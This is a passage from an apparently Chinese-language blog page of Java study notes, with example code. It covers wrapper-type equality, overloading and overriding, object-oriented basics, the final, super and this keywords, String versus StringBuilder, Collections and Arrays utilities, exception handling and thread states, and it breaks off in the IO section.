class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>         <br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">321</span>;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-number">321</span>;<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> <span class="hljs-number">3L</span>;<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">2L</span>;<br>         <br>        System.out.println(c==d);<br>        System.out.println(e==f);<span class="hljs-comment">//false</span><br>        System.out.println(c==(a+b));<br>        System.out.println(c.equals(a+b));<br>        System.out.println(g==(a+b));<br>        System.out.println(g.equals(a+b));<span class="hljs-comment">//false</span><br>        System.out.println(g.equals(a+h));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当 “&#x3D;&#x3D;”运算符的两个操作数都是 包装器类型的引用，则是比较指向的是否是同一个对象，而如果其中有一个操作数是表达式（即包含算术运算）则比较的是数值（即会触发自动拆箱的过程）。另外，对于包装器类型，equals方法并不会进行类型转换。</p><h3 id="重载与重写"><a href="#重载与重写" class="headerlink" title="重载与重写"></a>重载与重写</h3><h4 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h4><p>重载就是同样一个方法能够根据输入数据的不同，做出不同的处理；Java允许重载任何方法，而不止是构造器方法，因此要完整描述一个方法时需要指出方法名和参数类型，这叫做方法的签名（返回类型不是方法签名的一部分）。</p><h4 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h4><p>重写就是当子类继承父类的相同方法时，要求输入数据一样，但是要做出与父类不同的响应时，就需要覆盖父类方法。</p><p>重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。</p><ol><li>返回值类型、方法名、参数列表必须相同，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。</li><li>如果父类方法访问修饰符为private&#x2F;final&#x2F;static则子类就不能重写该方法，但是被static修饰的方法能够被再次声明。</li><li>构造方法无法被重写</li></ol><h2 id="Java面向对象"><a href="#Java面向对象" class="headerlink" title="Java面向对象"></a>Java面向对象</h2><h3 id="面向对象和面向过程的区别"><a href="#面向对象和面向过程的区别" class="headerlink" title="面向对象和面向过程的区别"></a>面向对象和面向过程的区别</h3><p>面向过程的性能一般比较好，因为类的调用需要实例化，开销比较大；但是面向过程没有面向对象那样容易维护、易复用、易扩展。</p><h3 id="构造器可否被override？"><a href="#构造器可否被override？" class="headerlink" title="构造器可否被override？"></a>构造器可否被override？</h3><p>构造器不可以被重写，但是可以被重载，一个类中可以有多个构造函数（因为可以重载）。</p><h3 id="在Java中构造一个空的并且没有参数的构造方法的作用"><a href="#在Java中构造一个空的并且没有参数的构造方法的作用" class="headerlink" title="在Java中构造一个空的并且没有参数的构造方法的作用"></a>在Java中构造一个空的并且没有参数的构造方法的作用</h3><p>Java在执行子类构造方法之前，如果没有用super()来调用父类特定的构造方法，则会调用父类中的“没有参数的构造方法”（帮助子类做初始化工作）。因此，如果父类中只定义了有参数的构造方法，而在子类的构造方法中有没有用super()来调用父类的构造方法，则编译时会发生错误（实际参数列表和形式参数列表长度不同），因为Java程序在父类中找不到没有参数的构造方法可供执行。</p><h3 id="成员变量与局部变量的区别？"><a href="#成员变量与局部变量的区别？" class="headerlink" title="成员变量与局部变量的区别？"></a>成员变量与局部变量的区别？</h3><ol><li>成员变量属于类，局部变量是方法中定义的变量或是方法的参数；成员变量可以被public、private、static修饰，局部变量不能被访问控制修饰符及static修饰</li><li>从变量在内存中存储方式来看：静态成员变量属于类（静态成员变量存储在堆的永久生成区域中），其余的属于实例，对象都是存储在堆内存，局部变量存储在栈内存。</li><li>在内存的生存时间：成员变量是对象的一部分，随着对象的存在而存在，局部变量随着方法调用自动消失。</li><li>成员变量如果没有赋值会默认赋值（final修饰的必须显式赋值），局部变量则不会自动赋值。</li></ol><p>注：new创建对象实例（对象实例在堆内存中），对象引用指向对象实例（引用存放在栈内存中）</p><h3 id="构造方法的特性"><a href="#构造方法的特性" class="headerlink" title="构造方法的特性"></a>构造方法的特性</h3><ol><li>名字与类名相同</li><li>没有返回值，但是不能用 void 声明构造函数</li><li>生成类的对象时自动执行，无需调用</li></ol><h3 id="面向对象的三大特征"><a href="#面向对象的三大特征" class="headerlink" title="面向对象的三大特征"></a>面向对象的三大特征</h3><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>封装是指把对象的状态信息（属性）隐藏在对象内部，不允许外部对象直接访问对象内部的信息，但是可以提供一些可以被外界访问的方法来操作属性。</p><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>同一个类实例的相同方法在不同情形下有不同的表现形式</p><ol><li>方法多态：① 方法重载：同一个方法名称可以根据参数的类型或个数不同调用不同的方法体 ② 方法覆写：同一个父类的方法可以根据实例化子类的不同也有不同的实现</li><li>对象多态：向上转型（将子类对象变成父类对象）和向下转型（强转，子类 子类实例 &#x3D; (子类)父类实例）</li></ol><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>继承是使用已存在的类定义作为基础建立新的类的技术，新的类可以增加新的数据或新的功能，也可以使用父类的功能，但不能选择性的继承父类。通过使用继承，可以快速创建新的类，可以提高代码的重用，程序的可维护，提高开发效率</p><p>子类拥有父类所有的属性和方法（包括私有属性和私有方法），但是父类中的私有属性和方法子类无法访问，只是拥有；子类可以拥有自己属性和方法，可扩展；子类可以用自己的方式实现父类的方法</p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>静态方法与实例方法的区别：外部调用静态方法时，可以使用类名.方法名的形式，也可以用对象名.方法名的形式，实例类只有后者；静态方法访问本类成员时只允许访问静态成员，不允许访问实例成员变量和实例方法</p><h4 id="super"><a href="#super" class="headerlink" title="super"></a>super</h4><ol><li><p>super.XXX 这里的XXX指的是父类的成员变量名即父类的属性，或者对象名 </p></li><li><p>super.XXX( ) 这里的XXX是父类中的其中一个方法名</p></li><li><p>super( )  这种形式指的是：调用父类没有参数的构造方法（也叫构造函数）（注意： 这里super( ) 只能放在子类的构造方法里面，并且只能放在构造方法的首句)</p></li><li><p>super( x,y,z…) 此形式指：调用父类有参数的构造方法，也必须放在子类的构造方法（成员方法不可以）里面，并且只能放在构造方法的首句。其中x,y,z是指的与父类此有参构造方法中参数数据类型相对应的子类中的参数</p></li></ol><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><ol><li>final修饰变量的特性</li></ol><p>final修饰的变量，这个变量是不可修改的。</p><p>这里又分为两个情况，分别是值不可修改和引用不可修改。</p><p>如果变量是值变量，那么该变量的值不能修改，比如定义了一个整型对象是final修饰的，那么这个对象开始值是多少就固定下来了，不 允许修改了，这个类似C语言里面的const。</p><p>如果变量是引用变量，比如定义了学生对象student并修饰为final的，那么student的年龄、姓名都可以修改，但是，不允许再给student赋值新的对象了，比如再执行student &#x3D;new Student()构造方法，这是不允许的。</p><ol start="2"><li>final修饰方法的特性</li></ol><p>final修饰后的方法，禁止子类继承的时候重写方法。</p><p>同时final修饰后的方法执行速度会更快，因为final修饰的类似C里面的内联机制，在调用方法的时候，直接将方法插入到方法调用的位置，这样方法调用就减少了寻址调用的时间开销。</p><ol start="3"><li>final修饰类的特性</li></ol><p>final修饰后的类，是禁止被继承的。</p><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><ol><li><p>this.data; &#x2F;&#x2F;访问属性</p></li><li><p>this.func(); &#x2F;&#x2F;访问方法</p></li><li><p>this(); &#x2F;&#x2F;调用本类中其他构造方法</p></li></ol><h3 id="接口和抽象类的区别"><a href="#接口和抽象类的区别" class="headerlink" title="接口和抽象类的区别"></a>接口和抽象类的区别</h3><ol><li>接口方法默认为public，jdk7或者更早版本中，接口里面只能有常量变量和抽象方法，并且接口方法必须由选择实现接口的类实现，所有方法在接口中不能有实现，jdk8的时候接口可以有默认方法和静态方法，jdk9在接口中引入了私有方法和私有静态属性；抽象类可以有非抽象方法</li><li>接口中只能由static、final变量，不能有其他变量，抽象类中不一定</li><li>一个类可以实现多个接口，但是只能实现一个抽象类。接口自己本身可以通过extends关键字扩展多个接口</li><li>接口方法默认修饰符为public，抽象方法可以有public、protected和default这些修饰符（抽象方法就是为了被重写，所以不能用private）</li><li>抽象是对类的抽象，是一种模板设计，接口是对行为的抽象，是一种行为规范</li></ol><h3 id="String、StringBuilder和StringBuffer"><a href="#String、StringBuilder和StringBuffer" class="headerlink" title="String、StringBuilder和StringBuffer"></a>String、StringBuilder和StringBuffer</h3><p>String类中使用final关键字修饰字符数组来保存字符串，<code>private final char[] value</code>（Java 9 之后改用byte数组存储，即byte[] value），因此String对象是不可变的。</p><p>而StringBuilder与StringBuffer都继承自AbstractStringBuilder类，其中字符串数组没有用final关键字修饰，因此这两种对象都是可变的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractStringBuilder</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Appendable</span>,CharSequence &#123;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* The value is used for character storage.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span>[] value;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* The count is the number of characters used.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> count;<br>AbstractStringBuilder(<span class="hljs-type">int</span> capacity) &#123;<br>value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[capacity];<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="线程安全性"><a href="#线程安全性" class="headerlink" title="线程安全性"></a>线程安全性</h4><p>String中对象是不可变，因此线程安全。</p><p>StringBuffer方法中添加了同步锁，因此是线程安全的</p><p>StringBulider没有对方法添加同步锁，因此是非线程安全的</p><h4 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h4><p>StringBuffer：可变字符串、效率低、线程安全；</p><p>StringBuilder：可变字符序列、效率高、线程不安全；</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>操作少量数据用String</p><p>单线程操作字符串缓冲区下大量数据使用StringBuilder</p><p>多线程操作字符串缓冲区下大量数据使用StringBuffer</p><h3 id="Java序列化时有些字段不想序列化怎么办"><a href="#Java序列化时有些字段不想序列化怎么办" class="headerlink" title="Java序列化时有些字段不想序列化怎么办"></a>Java序列化时有些字段不想序列化怎么办</h3><p>对于不想进行序列化的变量可以使用transient（暂存的）关键字修饰，该关键字可以阻止实例中使用此关键字修饰的变量的序列化</p><h3 id="获取键盘输入的常用方法"><a href="#获取键盘输入的常用方法" class="headerlink" title="获取键盘输入的常用方法"></a>获取键盘输入的常用方法</h3><h4 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-type">String</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> input.nextLine();<br>input.close();<br></code></pre></td></tr></table></figure><h4 id="BufferReader"><a href="#BufferReader" class="headerlink" title="BufferReader"></a>BufferReader</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br><span class="hljs-type">String</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>    in = input.readLine();<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Java核心技术"><a href="#Java核心技术" class="headerlink" title="Java核心技术"></a>Java核心技术</h2><h3 id="Collections工具类常见方法总结"><a href="#Collections工具类常见方法总结" class="headerlink" title="Collections工具类常见方法总结"></a>Collections工具类常见方法总结</h3><h4 id="排序等操作"><a href="#排序等操作" class="headerlink" title="排序等操作"></a>排序等操作</h4><p>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">reverse</span><span class="hljs-params">(List list)</span><span class="hljs-comment">//反转</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">shuffle</span><span class="hljs-params">(List list)</span><span class="hljs-comment">//随机排序</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(List list)</span><span class="hljs-comment">//按自然排序的升序排序</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(List list, Comparator c)</span><span class="hljs-comment">//定制排序，由Comparator控制排序逻辑</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(List list, <span class="hljs-type">int</span> i , <span class="hljs-type">int</span> j)</span><span class="hljs-comment">//交换两个索引位置的元素</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">rotate</span><span class="hljs-params">(List list, <span class="hljs-type">int</span> distance)</span><span class="hljs-comment">//旋转。当distance为正数时，将list后distance个元素整体移到前面。当distance为负数时，将 list的前distance个元素整体移到后面。</span><br></code></pre></td></tr></table></figure><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.stream.Collectors;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testCollections</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>&#125;;<br>        List&lt;Integer&gt; numsList = Arrays.stream(nums).boxed().collect(Collectors.toList());<br>        System.out.println(<span class="hljs-string">&quot;源字符列表：&quot;</span>);<br>        System.out.println(numsList);<br>        Collections.reverse(numsList);<br>        System.out.println(<span class="hljs-string">&quot;反转字符列表：&quot;</span>);<br>        System.out.println(numsList);<br>        System.out.println(<span class="hljs-string">&quot;排序字符列表：&quot;</span>);<br>        Collections.sort(numsList);<br>        System.out.println(numsList);<br>        System.out.println(<span class="hljs-string">&quot;shuffle字符列表：&quot;</span>);<br>        Collections.shuffle(numsList);<br>        System.out.println(numsList);<br>        System.out.println(<span class="hljs-string">&quot;自定义顺序字符列表：&quot;</span>);<br>        Comparator&lt;Integer&gt; reComp = (n1,n2) -&gt; n2 - n1; <span class="hljs-comment">// lambda</span><br>        Collections.sort(numsList, reComp);<br>        System.out.println(numsList);<br>        System.out.println(<span class="hljs-string">&quot;交换开头和结尾字符列表：&quot;</span>);<br>        Collections.swap(numsList,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>);<br>        System.out.println(numsList);<br>        System.out.println(<span class="hljs-string">&quot;旋转字符列表：&quot;</span>);<br>        Collections.rotate(numsList, <span class="hljs-number">5</span>); <span class="hljs-comment">//当distance为正数时，将list后distance个元素整体移到前面。当distance为负数时，将 list的前distance个元素整体移到后面。</span><br>        System.out.println(numsList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="查找替换"><a href="#查找替换" class="headerlink" title="查找替换"></a>查找替换</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">binarySearch</span><span class="hljs-params">(List list, Object key)</span><span class="hljs-comment">//对List进行二分查找，返回索引，注意List必须是有序的</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(Collection coll)</span><span class="hljs-comment">//根据元素的自然顺序，返回最大的元素。 类比int min(Collection coll)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(Collection coll, Comparator c)</span><span class="hljs-comment">//根据定制排序，返回最大元素，排序规则由Comparatator类控制。类比int min(Collection coll, Comparator c)</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">fill</span><span class="hljs-params">(List list, Object obj)</span><span class="hljs-comment">//用指定的元素代替指定list中的所有元素。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">frequency</span><span class="hljs-params">(Collection c, Object o)</span><span class="hljs-comment">//统计元素出现次数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">indexOfSubList</span><span class="hljs-params">(List list, List target)</span><span class="hljs-comment">//统计target在list中第一次出现的索引，找不到则返回-1，类比int lastIndexOfSubList(List source, list target).</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">replaceAll</span><span class="hljs-params">(List list, Object oldVal, Object newVal)</span>, 用新元素替换旧元素<br></code></pre></td></tr></table></figure><h3 id="Arrays工具类常见方法总结"><a href="#Arrays工具类常见方法总结" class="headerlink" title="Arrays工具类常见方法总结"></a>Arrays工具类常见方法总结</h3><ul><li>Arrays位于java.util包下(Arrays是一个操作数组的工具类)</li><li>Arrays包含各种操作数组的方法(例如排序和搜索)。该类还包含一个静态工厂，允许将数组视为列表。</li><li>Arrays类里的方法都是静态方法可以通过<code>Arrays.方法名()</code>直接调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Arrays.sort() <span class="hljs-comment">//排序 </span><br>Arrays.binarySearch() <span class="hljs-comment">// 查找</span><br>Arrays.equals() <span class="hljs-comment">//比较</span><br>Arrays.fill() <span class="hljs-comment">// 填充</span><br>Arrays.asList() <span class="hljs-comment">//转列表</span><br>Arrays.toString() <span class="hljs-comment">//转字符串</span><br>Arrays.copyOf() <span class="hljs-comment">//复制</span><br></code></pre></td></tr></table></figure><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testArrays</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        String[] s = &#123;<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>&#125;;<br>        String[] s1 = Arrays.copyOf(s,s.length);<br>        List&lt;String&gt; list = Arrays.asList(s);<br>        System.out.println(Arrays.toString(s));<br>        Arrays.sort(s);<br>        System.out.println(Arrays.toString(s));<br>        System.out.println(Arrays.binarySearch(s, <span class="hljs-string">&quot;c&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;Arrays.equals(s, s1):&quot;</span> + Arrays.equals(s, s1));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>异常类层次结构：</p><p> <img src="/images/javaexceptionstruct.png"></p><p><img src="/images/javaexceptioncheck.png"></p><p>Java中所有的异常都有一个共同的祖先java.lang包中的Throwable类，该类有两个重要的子类：Exception和Error，二者都是Java异常处理的重要子类，各自都包含大量子类。</p><p>Error是程序无法处理的错误，表示运行应用程序中较严重的问题。大多数错误与代码编写者执行的操作无关，而表示代码运行时Java虚拟机出现的问题。</p><p>Exception是程序本身可以处理的异常。</p><h4 id="Throwable类常用的方法"><a href="#Throwable类常用的方法" class="headerlink" title="Throwable类常用的方法"></a>Throwable类常用的方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> <span class="hljs-comment">//返回异常发生时的简单描述</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printStackTrace</span><span class="hljs-params">()</span> <span class="hljs-comment">//在控制台打印Throwable对象封装的异常信息</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> <span class="hljs-comment">// 返回异常发生时的详细信息</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLocalizedMessage</span><span class="hljs-params">()</span> <span class="hljs-comment">// 返回异常对象的本地化信息</span><br></code></pre></td></tr></table></figure><h4 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-comment">//some code may have some exception</span><br>&#125;<span class="hljs-keyword">catch</span>( RuntimeException e )&#123; <span class="hljs-comment">// catch some exception</span><br>    <span class="hljs-comment">//do something</span><br>&#125;<span class="hljs-keyword">catch</span>( IOException e )&#123; <span class="hljs-comment">// catch another exception</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br>...<br><span class="hljs-keyword">finally</span>&#123;<br>    <span class="hljs-comment">// both catch and not catch will do something</span><br>&#125;<br></code></pre></td></tr></table></figure><p>以下四种特殊情况下finally不会被执行：</p><ul><li>finally语句第一行发生了异常</li><li>在前面的代码中用了System.exit(int)已经退出程序。</li><li>程序所在的线程死亡</li><li>关闭CPU</li></ul><p>注意：当try语句和finally语句中都有return语句时，在方法返回之前，finally的语句将被执行，并且finally的语句的返回值将会覆盖原始的返回值</p><h4 id="try-with-resources"><a href="#try-with-resources" class="headerlink" title="try-with-resources"></a>try-with-resources</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> (<span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;test.txt&quot;</span>))) &#123;<br><span class="hljs-keyword">while</span> (scanner.hasNext()) &#123;<br>System.out.println(scanner.nextLine());<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (FileNotFoundException fnfe) &#123;<br>fnfe.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//读取⽂本⽂件的内容</span><br><span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>scanner = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;D://read.txt&quot;</span>));<br><span class="hljs-keyword">while</span> (scanner.hasNext()) &#123;<br>System.out.println(scanner.nextLine());<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>e.printStackTrace();<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br><span class="hljs-keyword">if</span> (scanner != <span class="hljs-literal">null</span>) &#123;<br>scanner.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过使用分号分隔，可以在try-with-resources块中声明多个资源</p><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>Java线程状态：</p><p><img src="/images/javathreadstatus.png"></p><p>线程状态变迁：</p><p><img src="/images/javathreadstatuschange.png"></p><p>线程创建之后处于NEW状态，调用start方法之后开始运行，线程这时候处于READY状态，可运行状态获得cpu时间片之后就处于RUNNING状态，操作系统对Java虚拟机隐藏READY和RUNNING状态，只能看到RUNNABLE状态。</p><p>当线程执行到wait方法之后，线程进入WAITING状态，进入等待状态的线程需要依靠其他线程的通知才能返回到运行状态，TIMED_WAITING状态相当于在等待基础上增加了超时限制，比如通过sleep方法或者wait(long millis)方法可以将Java线程置于TIMED_WAITING状态。当超时时间结束后重回RUNNABLE状态。当线程调用同步方法时，在没有获取到锁的情况下，线程会进入BLOCKED状态。线程执行完毕会进入TERMINATED状态。</p><h3 id="文件与IO"><a href="#文件与IO" class="headerlink" title="文件与IO"></a>文件与IO</h3><h4 id="Java中的IO流分类"><a href="#Java中的IO流分类" class="headerlink" title="Java中的IO流分类"></a>Java中的IO流分类</h4><ul><li>按照流向分为输入流和输出流</li><li>按照操作单元分为字节流和字符流</li><li>按照流的角色分为节点流和处理流</li></ul><p>InputStream&#x2F;Reader 字节输入流&#x2F;字符输入流</p><p>OutputStream&#x2F;Writer 